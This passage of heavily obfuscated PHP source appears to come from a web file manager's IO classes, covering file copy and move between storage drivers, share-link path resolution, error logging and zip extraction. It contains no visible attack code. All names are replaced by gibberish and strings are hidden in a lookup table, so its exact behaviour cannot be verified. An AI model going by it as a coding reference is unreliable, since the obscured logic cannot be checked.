$íòÜ»ûÖ->mkdir($íòÜ»ûÖ->getPath($ªáÎÕÓ∂)); $ƒ§‰¿ÖÒ = $íòÜ»ûÖ->getPathInner($¡çª÷•∑); $§¸“π˜¡ = $´Ë´ÙÇ§->listPath($˛£œ†Ê¨, !0); $§¸“π˜¡ = is_array($§¸“π˜¡) ? $§¸“π˜¡ : array($≈•æÁøÏ[86] => array(), $≈•æÁøÏ[87] => array()); $çí‡‡∆Ç = array_merge($§¸“π˜¡[$≈•æÁøÏ[86]], $§¸“π˜¡[$≈•æÁøÏ[87]]); foreach ($çí‡‡∆Ç as $«åÌÒ Ò) { $ó¬ïÇ¶˜ = $«åÌÒ Ò[$≈•æÁøÏ[33]] == $≈•æÁøÏ[202]; $˛£œ†Ê¨ = $´Ë´ÙÇ§->getPathInner($«åÌÒ Ò[$≈•æÁøÏ[88]]); $öä‹»¡ÿ = self::copyPath($´Ë´ÙÇ§, $˛£œ†Ê¨, $íòÜ»ûÖ, $ƒ§‰¿ÖÒ, $»‘‹éÍÔ, $ö˘ ·È˜, $ó¬ïÇ¶˜); if (!$öä‹»¡ÿ) { IO::errorTips($≈•æÁøÏ[1130] . $˛£œ†Ê¨ . $≈•æÁøÏ[80] . $ƒ§‰¿ÖÒ); } } self::copyMoveKeepInfo($´Ë´ÙÇ§, $˛£œ†Ê¨, $¡çª÷•∑); return $¡çª÷•∑; } private static function copyFile($ñ¿Ωıªº, $àÚâ≠ê⁄, $ß¨Œ≈·°, $µÌûøıŒ, $çı„å¬ﬂ, $È¢ãòèª) { $¢æü«»¡ =& $_SERVER[ëæªã÷]; $µÌûøıŒ = $ß¨Œ≈·°->getPath(rtrim($µÌûøıŒ, $¢æü«»¡[8]) . $¢æü«»¡[8] . $çı„å¬ﬂ); $∞èÅ”Ì = $¢æü«»¡[1131] . time() . rand_string(5); Hook::trigger($¢æü«»¡[1132], $ñ¿Ωıªº, $àÚâ≠ê⁄, $ß¨Œ≈·°, $µÌûøıŒ, $çı„å¬ﬂ, $∞èÅ”Ì); if (self::driverIsSame($ñ¿Ωıªº, $ß¨Œ≈·°)) { if ($È¢ãòèª) { $Â◊ ¥ÔÛ = $ß¨Œ≈·°->moveFile($àÚâ≠ê⁄, $µÌûøıŒ); } else { $Â◊ ¥ÔÛ = $ß¨Œ≈·°->copyFile($àÚâ≠ê⁄, $µÌûøıŒ); } Hook::trigger($¢æü«»¡[1133], $ñ¿Ωıªº, $àÚâ≠ê⁄, $ß¨Œ≈·°, $µÌûøıŒ, $çı„å¬ﬂ, $Â◊ ¥ÔÛ); self::copyMoveKeepInfo($ñ¿Ωıªº, $àÚâ≠ê⁄, $Â◊ ¥ÔÛ); return $Â◊ ¥ÔÛ; } $⁄⁄Ù’› = TEMP_FILES; if ($GLOBALS[$¢æü«»¡[6]][$¢æü«»¡[100]][$¢æü«»¡[776]]) { $⁄⁄Ù’› = $GLOBALS[$¢æü«»¡[6]][$¢æü«»¡[100]][$¢æü«»¡[776]]; } $˙‚—ø≥Ñ = $⁄⁄Ù’›; mk_dir($˙‚—ø≥Ñ); $ÜêØ£‹¨ = $˙‚—ø≥Ñ . $∞èÅ”Ì; $˛ñßà∑∞ = $ÜêØ£‹¨; $ÜêØ£‹¨ = $ñ¿Ωıªº->download($àÚâ≠ê⁄, $ÜêØ£‹¨); $ÜêØ£‹¨ = $ñ¿Ωıªº->iconvApp($ÜêØ£‹¨); if (substr($ÜêØ£‹¨, strlen($⁄⁄Ù’›)) == $⁄⁄Ù’›) { $È¢ãòèª = !0; } $Â◊ ¥ÔÛ = $ß¨Œ≈·°->upload($µÌûøıŒ, $ÜêØ£‹¨, $È¢ãòèª); self::remove($˛ñßà∑∞); Hook::trigger($¢æü«»¡[1133], $ñ¿Ωıªº, $àÚâ≠ê⁄, $ß¨Œ≈·°, $µÌûøıŒ, $çı„å¬ﬂ, $Â◊ ¥ÔÛ); self::copyMoveKeepInfo($ñ¿Ωıªº, $àÚâ≠ê⁄, $Â◊ ¥ÔÛ); return $Â◊ ¥ÔÛ; } private static function copyMoveKeepInfo($∞È–√ßÖ, $û—õœ∞Ã, $‹Ç¯ãÁô) { if (!$‹Ç¯ãÁô) { return; } $áŒ˛ô¿Ó = $∞È–√ßÖ->info($û—õœ∞Ã); if (!is_array($áŒ˛ô¿Ó)) { return; } IO::setModifyTime($‹Ç¯ãÁô, $áŒ˛ô¿Ó[$_SERVER[ëæªã÷][96]]); } public static function pathFather($úøê™Á¿) { $›¬≈≥Ñ¯ = IO::init($úøê™Á¿); $ûö”ß≠√ = $›¬≈≥Ñ¯->pathFather($›¬≈≥Ñ¯->path); return $›¬≈≥Ñ¯->getPathOuter($ûö”ß≠√); } public static function fileOut($◊∫ÑÌ˘„, $ú˙¿ïá± = false, $≤≥Øñ«® = false, $‹î†Æ‰ÿ = '') { $·ÅŒ˛´ñ = self::driverMake($◊∫ÑÌ˘„); if ($·ÅŒ˛´ñ->isFileOutServer()) { return $·ÅŒ˛´ñ->fileOutServer($◊∫ÑÌ˘„, $ú˙¿ïá±, $≤≥Øñ«®, $‹î†Æ‰ÿ); } return $·ÅŒ˛´ñ->fileOut($◊∫ÑÌ˘„, $ú˙¿ïá±, $≤≥Øñ«®, $‹î†Æ‰ÿ); } public static function fileOutImage($äÍ§∏Úô, $êàäΩ¯õ = 250) { $ûŸ¶è·Ï = array(250, 600, 1200, 2000, 3000, 5000); for ($Ä¶üÚï˛ = 0; $Ä¶üÚï˛ < count($ûŸ¶è·Ï); $Ä¶üÚï˛++) { if ($Ä¶üÚï˛ == 0 && $êàäΩ¯õ <= $ûŸ¶è·Ï[$Ä¶üÚï˛]) { $êàäΩ¯õ = $ûŸ¶è·Ï[$Ä¶üÚï˛]; break; } else { if ($êàäΩ¯õ > $ûŸ¶è·Ï[$Ä¶üÚï˛ - 1] && $êàäΩ¯õ <= $ûŸ¶è·Ï[$Ä¶üÚï˛]) { $êàäΩ¯õ = $ûŸ¶è·Ï[$Ä¶üÚï˛]; break; } else { if ($Ä¶üÚï˛ == count($ûŸ¶è·Ï) - 1 && $êàäΩ¯õ > $ûŸ¶è·Ï[$Ä¶üÚï˛]) { $êàäΩ¯õ = $ûŸ¶è·Ï[$Ä¶üÚï˛]; break; } } } } $Ñ¢Ë®ÄÚ = self::driverMake($äÍ§∏Úô); if ($Ñ¢Ë®ÄÚ->isFileOutServer()) { return $Ñ¢Ë®ÄÚ->fileOutImageServer($äÍ§∏Úô, $êàäΩ¯õ); } return $Ñ¢Ë®ÄÚ->fileOutImage($äÍ§∏Úô, $êàäΩ¯õ); } private static function driverIsSame($≈∑Ë¸«, $‰‚ÏƒÔá) { $ÕÁÂ±ó˝ =& $_SERVER[ëæªã÷]; $Ø‰È«î≥ = $≈∑Ë¸«->getType(); $ôê‚ÊŸ° = $‰‚ÏƒÔá->getType(); if ($Ø‰È«î≥ != $ôê‚ÊŸ°) { return !1; } if ($Ø‰È«î≥ == $ÕÁÂ±ó˝[738]) { return !0; } if ($Ø‰È«î≥ == $ÕÁÂ±ó˝[117]) { return !0; } if ($≈∑Ë¸«->pathDriver == $‰‚ÏƒÔá->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÒûÁ›÷ñ, $ıáŒ æ) { $ÈÑ·°—æ =& $_SERVER[ëæªã÷]; if (!IO::exist($ÒûÁ›÷ñ)) { return !1; } if (!IO::exist($ıáŒ æ)) { IO::mkdir($ıáŒ æ); } $˚ää‡®î = self::_listAll($ÒûÁ›÷ñ); $ä√æÉÜ˝ = self::_listAll($ıáŒ æ); $üªûÉü± = array(); $«›◊⁄óÚ = array(); foreach ($˚ää‡®î as $îº≤®¬µ => $–«ƒ±ç≈) { if (isset($ä√æÉÜ˝[$îº≤®¬µ])) { if ($–«ƒ±ç≈[$ÈÑ·°—æ[89]] == 1) { continue; } if ($ä√æÉÜ˝[$îº≤®¬µ][$ÈÑ·°—æ[90]] == $–«ƒ±ç≈[$ÈÑ·°—æ[90]]) { continue; } } if ($–«ƒ±ç≈[$ÈÑ·°—æ[89]] == 1) { $«›◊⁄óÚ[] = $ıáŒ æ . $ÈÑ·°—æ[8] . $îº≤®¬µ; continue; } $Ûï˜Ä·¢ = strstr(trim($îº≤®¬µ, $ÈÑ·°—æ[8]), $ÈÑ·°—æ[8]) ? get_path_father($îº≤®¬µ) : $ÈÑ·°—æ[12]; $üªûÉü±[] = array($ÈÑ·°—æ[1134] => $–«ƒ±ç≈[$ÈÑ·°—æ[88]], $ÈÑ·°—æ[1135] => rtrim($ıáŒ æ, $ÈÑ·°—æ[8]) . $ÈÑ·°—æ[8] . $Ûï˜Ä·¢, $ÈÑ·°—æ[1136] => $–«ƒ±ç≈); } $Í≠©ÕÚﬁ = array($ÈÑ·°—æ[202] => $üªûÉü±, $ÈÑ·°—æ[89] => $«›◊⁄óÚ); Hook::trigger($ÈÑ·°—æ[1137], $ÒûÁ›÷ñ, $ıáŒ æ, $Í≠©ÕÚﬁ); foreach ($«›◊⁄óÚ as $–«ƒ±ç≈) { IO::mkdir($–«ƒ±ç≈); } foreach ($üªûÉü± as $–«ƒ±ç≈) { IO::copy($–«ƒ±ç≈[$ÈÑ·°—æ[1134]], $–«ƒ±ç≈[$ÈÑ·°—æ[1135]], REPEAT_REPLACE); } } private static function _listAll($°ıÆç†¨) { $Äççñöœ =& $_SERVER[ëæªã÷]; $°ıÆç†¨ = KodIO::clear($°ıÆç†¨); $ç“ƒìå◊ = IO::listAll($°ıÆç†¨); foreach ($ç“ƒìå◊ as &$‹»á ¸ı) { $ΩñËπ£Ã = substr($‹»á ¸ı[$Äççñöœ[88]], strlen($°ıÆç†¨)); $‹»á ¸ı[$Äççñöœ[1138]] = trim($ΩñËπ£Ã, $Äççñöœ[8]); } unset($‹»á ¸ı); return array_to_keyvalue($ç“ƒìå◊, $Äççñöœ[1138]); } public static function fileSubstr($ÆùûìœÚ, $áû ƒ˚ó, $ö≤∑çúÕ = false) { $≤≤√ØΩÜ =& $_SERVER[ëæªã÷]; $≠ë˘Ÿıâ = self::driverMake($ÆùûìœÚ); $û≠„¯∏Ù = $≠ë˘Ÿıâ->size($ÆùûìœÚ); $ÏõÏ≠ÓŒ = $áû ƒ˚ó; $º˚∑›ƒ‘ = $ö≤∑çúÕ; if ($áû ƒ˚ó < 0) { $áû ƒ˚ó = $û≠„¯∏Ù + $áû ƒ˚ó; } if ($ö≤∑çúÕ === !1) { $ö≤∑çúÕ = $û≠„¯∏Ù - $áû ƒ˚ó; } if ($áû ƒ˚ó + $ö≤∑çúÕ > $û≠„¯∏Ù) { $ö≤∑çúÕ = $û≠„¯∏Ù - $áû ƒ˚ó; } if (!$û≠„¯∏Ù && $≠ë˘Ÿıâ->getType() == $≤≤√ØΩÜ[117] && !$≠ë˘Ÿıâ->exist($ÆùûìœÚ)) { throw new Exception($≤≤√ØΩÜ[1139] . LNG($≤≤√ØΩÜ[1140]) . $≤≤√ØΩÜ[942] . get_path_this($ÆùûìœÚ) . $≤≤√ØΩÜ[12]); } if ($ö≤∑çúÕ <= 0) { return $≤≤√ØΩÜ[12]; } if ($áû ƒ˚ó < 0 || $áû ƒ˚ó >= $û≠„¯∏Ù || $ö≤∑çúÕ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\x52\145\141\144\40\x65\x72\x72\x6f\162\41\x20\163\x74\141\162\x74\x3d{$áû ƒ˚ó}\73\154\x65\156\x67\x74\x68\75{$ö≤∑çúÕ}\x3b\40\x73\151\172\145\x3d{$û≠„¯∏Ù}\73"); } $¥©…úÌÿ = $≠ë˘Ÿıâ->fileSubstr($ÆùûìœÚ, $áû ƒ˚ó, $ö≤∑çúÕ); if (!$¥©…úÌÿ && $ö≤∑çúÕ && isset($GLOBALS[$≤≤√ØΩÜ[1141]])) { throw new Exception($GLOBALS[$≤≤√ØΩÜ[1141]][$≤≤√ØΩÜ[1142]]); } return $¥©…úÌÿ; } private static function driverMake(&$Ê¸ﬂËπÄ) { $îíÅÌ¯¨ =& $_SERVER[ëæªã÷]; $®¯œ’‰Å = KodIO::parse($Ê¸ﬂËπÄ); if (!self::$driverListSystem) { $≥ø≥ÀÙ· = Model($îíÅÌ¯¨[747])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($≥ø≥ÀÙ·, $îíÅÌ¯¨[401]); } if ($®¯œ’‰Å[$îíÅÌ¯¨[33]] == KodIO::KOD_IO && !self::$driverListSystem[$®¯œ’‰Å[$îíÅÌ¯¨[401]]]) { return !1; } $Ê¸ﬂËπÄ = $®¯œ’‰Å[$îíÅÌ¯¨[1143]]; $öÂê‚€Ô = self::driverGet($®¯œ’‰Å, $Ê¸ﬂËπÄ); return $öÂê‚€Ô; } private static function driverGet($–¨‘ÚâÔ, &$ª‰ˆµ¬à) { $˛”™©È∞ =& $_SERVER[ëæªã÷]; $§û”õˆÀ = $–¨‘ÚâÔ[$˛”™©È∞[1144]]; $™¸ÄÈ·± = $–¨‘ÚâÔ[$˛”™©È∞[401]]; switch ($–¨‘ÚâÔ[$˛”™©È∞[33]]) { case KodIO::KOD_IO: $ãï´Í∞õ = self::$driverListSystem[$™¸ÄÈ·±]; break; case KodIO::KOD_SOURCE: $ª‰ˆµ¬à = $™¸ÄÈ·± . $ª‰ˆµ¬à; $ãï´Í∞õ = array($˛”™©È∞[1145] => $˛”™©È∞[1146], $˛”™©È∞[6] => $–¨‘ÚâÔ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ ˝æÕ˙ò = $GLOBALS[$˛”™©È∞[1147]]; self::$driverListUser = array_to_keyvalue($ ˝æÕ˙ò, $˛”™©È∞[401]); } $ãï´Í∞õ = self::$driverListUser[$™¸ÄÈ·±]; break; case KodIO::KOD_SHARE_LINK: $ãï´Í∞õ = array($˛”™©È∞[1145] => $˛”™©È∞[1148], $˛”™©È∞[6] => $–¨‘ÚâÔ); $Ω‰Â«ÙÉ = Action($˛”™©È∞[1149])->sharePathInfo($–¨‘ÚâÔ[$˛”™©È∞[88]]); $ª‰ˆµ¬à = $Ω‰Â«ÙÉ[$˛”™©È∞[403]]; if (!$Ω‰Â«ÙÉ[$˛”™©È∞[403]]) { $å÷Í—øÍ = Model($˛”™©È∞[595])->getInfo($Ω‰Â«ÙÉ[$˛”™©È∞[488]]); $ª‰ˆµ¬à = KodIO::clear($å÷Í—øÍ[$˛”™©È∞[1150]] . $–¨‘ÚâÔ[$˛”™©È∞[1143]]); $–¨‘ÚâÔ[$˛”™©È∞[486]] = $å÷Í—øÍ; $–¨‘ÚâÔ[$˛”™©È∞[1127]] = $ª‰ˆµ¬à; $ãï´Í∞õ = array($˛”™©È∞[1145] => $˛”™©È∞[1151], $˛”™©È∞[6] => $–¨‘ÚâÔ); } break; case KodIO::KOD_SHARE_ITEM: $ãï´Í∞õ = array($˛”™©È∞[1145] => $˛”™©È∞[1152], $˛”™©È∞[6] => $–¨‘ÚâÔ); $å÷Í—øÍ = Model($˛”™©È∞[595])->getInfo($–¨‘ÚâÔ[$˛”™©È∞[401]]); if ($å÷Í—øÍ[$˛”™©È∞[403]] == $˛”™©È∞[200]) { $ª‰ˆµ¬à = KodIO::clear($å÷Í—øÍ[$˛”™©È∞[1150]] . $–¨‘ÚâÔ[$˛”™©È∞[1143]]); $–¨‘ÚâÔ[$˛”™©È∞[486]] = $å÷Í—øÍ; $–¨‘ÚâÔ[$˛”™©È∞[1127]] = $ª‰ˆµ¬à; $ãï´Í∞õ = array($˛”™©È∞[1145] => $˛”™©È∞[1153], $˛”™©È∞[6] => $–¨‘ÚâÔ); } else { if (!$ª‰ˆµ¬à) { $ª‰ˆµ¬à = $å÷Í—øÍ[$˛”™©È∞[403]]; } } break; default: $ª‰ˆµ¬à = $–¨‘ÚâÔ[$˛”™©È∞[88]]; $ãï´Í∞õ = array($˛”™©È∞[1145] => $˛”™©È∞[1154]); break; } $Ü≥û¸Ë≠ = $–¨‘ÚâÔ[$˛”™©È∞[88]]; if (!isset(self::$driverCache[$Ü≥û¸Ë≠])) { $™ì•¶›Ã = strtolower($ãï´Í∞õ[$˛”™©È∞[106]]); $çù∫ª‚È = $GLOBALS[$˛”™©È∞[6]][$˛”™©È∞[100]][$˛”™©È∞[806]]; $„É÷µû÷ = $˛”™©È∞[84] . (isset($çù∫ª‚È[$™ì•¶›Ã]) ? $çù∫ª‚È[$™ì•¶›Ã] : ucfirst($™ì•¶›Ã)); if (!class_exists($„É÷µû÷)) { show_json("{$„É÷µû÷}\40\156\x6f\x74\40\145\170\x69\x73\164\163\x21", !1); } $¶·õ–≈” = isset($ãï´Í∞õ[$˛”™©È∞[6]]) ? $ãï´Í∞õ[$˛”™©È∞[6]] : !1; self::$driverCache[$Ü≥û¸Ë≠] = new $„É÷µû÷($¶·õ–≈”); } $’Ω¶ÌÂ— = self::$driverCache[$Ü≥û¸Ë≠]; $’Ω¶ÌÂ—->pathDriver = $§û”õˆÀ; $’Ω¶ÌÂ—->pathBase = $˛”™©È∞[12]; if (isset($ãï´Í∞õ[$˛”™©È∞[6]][$˛”™©È∞[1155]])) { $’Ω¶ÌÂ—->pathBase = rtrim($ãï´Í∞õ[$˛”™©È∞[6]][$˛”™©È∞[1155]], $˛”™©È∞[8]) . $˛”™©È∞[8]; $ª‰ˆµ¬à = $’Ω¶ÌÂ—->pathBase . ltrim($ª‰ˆµ¬à, $˛”™©È∞[8]); } $ª‰ˆµ¬à = $’Ω¶ÌÂ—->getPath($ª‰ˆµ¬à); if (isset($–¨‘ÚâÔ[$˛”™©È∞[1127]])) { $ª‰ˆµ¬à = $–¨‘ÚâÔ[$˛”™©È∞[1127]]; } $’Ω¶ÌÂ—->path = $ª‰ˆµ¬à; return $’Ω¶ÌÂ—; } public static function errorTips($⁄¯˙÷Â» = false) { $üÿîﬁ«Ÿ =& $_SERVER[ëæªã÷]; static $“ΩÉ÷Ú⁄ = array(); $∏°ÏÕ˛Î = 1000; if ($⁄¯˙÷Â» === -1) { return $“ΩÉ÷Ú⁄ ? $“ΩÉ÷Ú⁄[count($“ΩÉ÷Ú⁄) - 1] : $üÿîﬁ«Ÿ[12]; } if ($⁄¯˙÷Â» === !1) { return implode($üÿîﬁ«Ÿ[65], $“ΩÉ÷Ú⁄); } if (count($“ΩÉ÷Ú⁄) >= $∏°ÏÕ˛Î) { $“ΩÉ÷Ú⁄ = array_slice($“ΩÉ÷Ú⁄, $∏°ÏÕ˛Î * 0.5, $∏°ÏÕ˛Î); } $“ΩÉ÷Ú⁄[] = $⁄¯˙÷Â»; write_log($üÿîﬁ«Ÿ[169] . ACTION . $üÿîﬁ«Ÿ[1156] . $⁄¯˙÷Â», $üÿîﬁ«Ÿ[1157]); } public static function getLastError($˙œàÇÍÔ = '') { $¶Òß›‰÷ = self::errorTips(-1); return $¶Òß›‰÷ ? $¶Òß›‰÷ : $˙œàÇÍÔ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Êê¢®¬Ù; if (!$Êê¢®¬Ù) { $â‚√ÒÒ£ = IO::init($_SERVER[ëæªã÷][8]); } return $â‚√ÒÒ£; } private static function iconvSystem($¡§Û◊ÕÅ) { return self::local()->iconvSystem($¡§Û◊ÕÅ); } private static function iconvApp($Âﬂ¡Ô¡¡) { return self::local()->iconvApp($Âﬂ¡Ô¡¡); } public static function zip($¯¸•á»£, $ÔÇÛ≥Çí = "\x7a\151\x70", $µ»Ö—∂¸ = '', $≥’®ƒŸ´ = REPEAT_RENAME) { $ÅùÁµÙÀ =& $_SERVER[ëæªã÷]; $◊í„ΩÆ« = self::init($¯¸•á»£[0][$ÅùÁµÙÀ[88]]); $ÉÑ¥éÜä = self::info($¯¸•á»£[0][$ÅùÁµÙÀ[88]]); $›õé˚ÉÉ = !1; if (!$µ»Ö—∂¸ && $◊í„ΩÆ«->getType() == $ÅùÁµÙÀ[117]) { $´ïÛÕÄ” = self::zipFileList($¯¸•á»£); } else { $›õé˚ÉÉ = $µ»Ö—∂¸ ? $µ»Ö—∂¸ : TEMP_FILES . $ÅùÁµÙÀ[1158] . time() . rand_string(8) . $ÅùÁµÙÀ[8]; mk_dir($›õé˚ÉÉ); $´ïÛÕÄ” = self::zipFileList($¯¸•á»£, $›õé˚ÉÉ); } $˚äôüù‰ = $ÉÑ¥éÜä[$ÅùÁµÙÀ[32]]; if (count($´ïÛÕÄ”) > 1) { $„·π≥áÏ = IO::info(IO::pathFather($ÉÑ¥éÜä[$ÅùÁµÙÀ[88]])); $˚äôüù‰ = $„·π≥áÏ[$ÅùÁµÙÀ[32]]; } $’µ∞ø†É = $›õé˚ÉÉ; if (!$’µ∞ø†É) { $’µ∞ø†É = get_path_father($ÉÑ¥éÜä[$ÅùÁµÙÀ[88]]); if (!$µ»Ö—∂¸ && $◊í„ΩÆ«->getType() == $ÅùÁµÙÀ[117]) { $’µ∞ø†É = get_path_father($◊í„ΩÆ«->path); } $ñÑ˝»óî = IO::info($’µ∞ø†É); if (!$ñÑ˝»óî[$ÅùÁµÙÀ[205]]) { show_json(LNG($ÅùÁµÙÀ[1159]), !1); } } $ ®Ä¡¬Æ = $’µ∞ø†É . $˚äôüù‰ . $ÅùÁµÙÀ[10] . $ÔÇÛ≥Çí; $ ®Ä¡¬Æ = get_filename_auto($ ®Ä¡¬Æ, $ÅùÁµÙÀ[12], $≥’®ƒŸ´); $ÖÉ˙Ø›√ = self::iconvSystem($ ®Ä¡¬Æ); foreach ($´ïÛÕÄ” as $√∫ˆöë± => $å„»ô‡ﬁ) { $´ïÛÕÄ”[$√∫ˆöë±] = self::iconvSystem($å„»ô‡ﬁ); } KodArchive::create($ÖÉ˙Ø›√, $´ïÛÕÄ”); if (!IO::exist($ ®Ä¡¬Æ)) { if ($›õé˚ÉÉ) { del_dir($›õé˚ÉÉ); } show_json(LNG($ÅùÁµÙÀ[1160]), !1); } if ($µ»Ö—∂¸ || !$›õé˚ÉÉ) { if ($›õé˚ÉÉ && strstr($›õé˚ÉÉ, TEMP_FILES)) { $’Çı‚ñ = $´ïÛÕÄ” = array(); recursion_dir($’µ∞ø†É, $’Çı‚ñ, $´ïÛÕÄ”, 0); foreach ($’Çı‚ñ as $¡ä√ü§∆) { del_dir($¡ä√ü§∆); } foreach ($´ïÛÕÄ” as $âñô≥Ú») { if ($âñô≥Ú» == $ÖÉ˙Ø›√) { continue; } del_file($âñô≥Ú»); } } return $ ®Ä¡¬Æ; } $äÚæúÕ– = self::pathFather($ÉÑ¥éÜä[$ÅùÁµÙÀ[88]]); $ÒàﬁÛü¨ = self::move($ ®Ä¡¬Æ, $äÚæúÕ–, $≥’®ƒŸ´); if (!$ÒàﬁÛü¨) { del_dir($›õé˚ÉÉ); show_json(LNG($ÅùÁµÙÀ[1160]), !1); } del_dir($›õé˚ÉÉ); return $ÒàﬁÛü¨; } public static function unzip($‘™·îì, $à—Í≤∆ı = "\x72\x65\x70\x6c\x61\x63\x65") { $¯˛§√≈≤ =& $_SERVER[ëæªã÷]; $”òÍ±¬Ì = $‘™·îì[$¯˛§√≈≤[88]]; $åñÇÙ€Û = $‘™·îì[$¯˛§√≈≤[1161]]; if (!($¸’âéÅß = parent::info($”òÍ±¬Ì))) { show_json(LNG($¯˛§√≈≤[1162]), !1); } if (!($≤ÄÃªÆŸ = parent::infoFull($åñÇÙ€Û))) { $åñÇÙ€Û = parent::mkdir($åñÇÙ€Û); $≤ÄÃªÆŸ = array($¯˛§√≈≤[88] => $åñÇÙ€Û); } else { if (isset($≤ÄÃªÆŸ[$¯˛§√≈≤[403]]) && trim($≤ÄÃªÆŸ[$¯˛§√≈≤[88]], $¯˛§√≈≤[8]) != trim($åñÇÙ€Û, $¯˛§√≈≤[8])) { $˙¢∞Ãí∏ = KodIO::make($≤ÄÃªÆŸ[$¯˛§√≈≤[498]]); $πÔ√“¢— = parent::fileNameAuto($˙¢∞Ãí∏, $≤ÄÃªÆŸ[$¯˛§√≈≤[32]], REPEAT_RENAME_FOLDER, !0); $åñÇÙ€Û = parent::mkdir($˙¢∞Ãí∏ . $πÔ√“¢—); $≤ÄÃªÆŸ = array($¯˛§√≈≤[88] => $åñÇÙ€Û); } } $åñÇÙ€Û = $≤ÄÃªÆŸ[$¯˛§√≈≤[88]]; $˜°∂áüº = self::tmpFileName($¸’âéÅß); $Ç˜òàâ¨ = TEMP_FILES . $˜°∂áüº; del_dir($Ç˜òàâ¨); mk_dir($Ç˜òàâ¨); $ﬁßÎå◊ƒ = self::fileExt($¸’âéÅß); $è‘†√‚∏ = $Ç˜òàâ¨ . $¯˛§√≈≤[10] . $ﬁßÎå◊ƒ; if (!@file_exists(self::iconvSystem($è‘†√‚∏))) { $àíé„—Ë = self::localFilePath($”òÍ±¬Ì, $ﬁßÎå◊ƒ); $è‘†√‚∏ = $àíé„—Ë ? $àíé„—Ë : parent::download($”òÍ±¬Ì, $è‘†√‚∏); } $è‘†√‚∏ = self::iconvSystem($è‘†√‚∏); $◊◊˜∞»ü = isset($‘™·îì[$¯˛§√≈≤[1163]]) ? $‘™·îì[$¯˛§√≈≤[1163]] : $¯˛§√≈≤[1164]; $≥£≤Âäö = KodArchive::extract($è‘†√‚∏, $Ç˜òàâ¨ . $¯˛§√≈≤[8], $◊◊˜∞»ü); self::archiveExt(); if (!$≥£≤Âäö[$¯˛§√≈≤[1165]]) { show_json($¯˛§√≈≤[1166] . $≥£≤Âäö[$¯˛§√≈≤[1167]], !1); } Hook::trigger($¯˛§√≈≤[1168], $Ç˜òàâ¨); recursion_dir($Ç˜òàâ¨, $åäÔù§¸, $ÎµÃ∂Û™, 0); $∞˚§üÈç = array_merge($åäÔù§¸, $ÎµÃ∂Û™); foreach ($∞˚§üÈç as $≈Çø°›ú) { $≈Çø°›ú = self::iconvApp($≈Çø°›ú); self::move($≈Çø°›ú, $åñÇÙ€Û, $à—Í≤∆ı); } del_dir($Ç˜òàâ¨); if (!$àíé„—Ë) { del_file($è‘†√‚∏); } return !0; } public static function unzipList($“ìì®Ë∂) { $ªÑ˛¨ë» =& $_SERVER[ëæªã÷]; $˚®øÇ≤í = $“ìì®Ë∂[$ªÑ˛¨ë»[88]]; $ÅªÖîËß = isset($“ìì®Ë∂[$ªÑ˛¨ë»[1169]]) ? $“ìì®Ë∂[$ªÑ˛¨ë»[1169]] : -1; $Ï¶è‹ö§ = 50000; if (request_url_safe($˚®øÇ≤í)) { $ã¯ÎÆÿﬁ = parse_url_query($˚®øÇ≤í); if (!isset($ã¯ÎÆÿﬁ[$ªÑ˛¨ë»[88]])) { show_json($ªÑ˛¨ë»[1170], !1); } } $œ£…°°ª = isset($ã¯ÎÆÿﬁ) ? $ã¯ÎÆÿﬁ[$ªÑ˛¨ë»[88]] : $˚®øÇ≤í; $”’˜Ω≤° = self::info($œ£…°°ª); $¢ÓÕπÖ« = self::fileExt($”’˜Ω≤°); $é‡ŒãÂ¯ = self::tmpFileName($”’˜Ω≤°); if (isset($ã¯ÎÆÿﬁ)) { $ﬁõÆ»ÅŸ = array($ã¯ÎÆÿﬁ[$ªÑ˛¨ë»[88]], $ã¯ÎÆÿﬁ[$ªÑ˛¨ë»[1169]], $ã¯ÎÆÿﬁ[$ªÑ˛¨ë»[32]]); $’íâù«∏ = md5(implode($ªÑ˛¨ë»[11], $ﬁõÆ»ÅŸ)) . $ªÑ˛¨ë»[10] . get_path_ext($ã¯ÎÆÿﬁ[$ªÑ˛¨ë»[32]]); } else { $ﬁõÆ»ÅŸ = array($”’˜Ω≤°[$ªÑ˛¨ë»[32]], $”’˜Ω≤°[$ªÑ˛¨ë»[88]], $”’˜Ω≤°[$ªÑ˛¨ë»[90]]); $’íâù«∏ = md5(implode($ªÑ˛¨ë»[11], $ﬁõÆ»ÅŸ)) . $ªÑ˛¨ë»[10] . $¢ÓÕπÖ«; } if ($ÅªÖîËß == -1) { $Æõä’ΩÌ = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\151\145\167\x2f{$é‡ŒãÂ¯}\57{$’íâù«∏}\56\x6c\157\x67"; $∂ÖÖ∂Ä = self::infoFull($Æõä’ΩÌ); if ($∂ÖÖ∂Ä) { $Æõä’ΩÌ = $∂ÖÖ∂Ä[$ªÑ˛¨ë»[88]]; $≈ôªÜ§Ω = self::getContent($Æõä’ΩÌ); if ($≈ôªÜ§Ω) { $´äÎóÁ∆ = json_decode($≈ôªÜ§Ω, !0); $´äÎóÁ∆ = is_array($´äÎóÁ∆) ? $´äÎóÁ∆ : array(); if (count($´äÎóÁ∆) >= $Ï¶è‹ö§) { show_json(sprintf(LNG($ªÑ˛¨ë»[1171]), count($´äÎóÁ∆)), !1); } return $´äÎóÁ∆; } } else { $Æõä’ΩÌ = self::mkfile($Æõä’ΩÌ); } } $ö√µÀé˛ = TEMP_FILES . $é‡ŒãÂ¯; if (!is_dir($ö√µÀé˛)) { mk_dir($ö√µÀé˛); } $ê–˙˝ıå = $ö√µÀé˛ . $ªÑ˛¨ë»[8] . $’íâù«∏; if (!@file_exists(self::iconvSystem($ê–˙˝ıå))) { if (isset($ã¯ÎÆÿﬁ)) { url_request($˚®øÇ≤í, $ªÑ˛¨ë»[1172], $ê–˙˝ıå); } else { $ÁÙàæØÌ = self::localFilePath($˚®øÇ≤í, $¢ÓÕπÖ«); $ê–˙˝ıå = $ÁÙàæØÌ ? $ÁÙàæØÌ : self::download($˚®øÇ≤í, $ê–˙˝ıå); } } $ê–˙˝ıå = self::iconvSystem($ê–˙˝ıå); if ($ÅªÖîËß >= 0) { $É˘ ƒô⁄ = isset($“ìì®Ë∂[$ªÑ˛¨ë»[1173]]) ? $“ìì®Ë∂[$ªÑ˛¨ë»[1173]] : !1; $ú‹∂‚∂é = isset($“ìì®Ë∂[$ªÑ˛¨ë»[32]]) ? 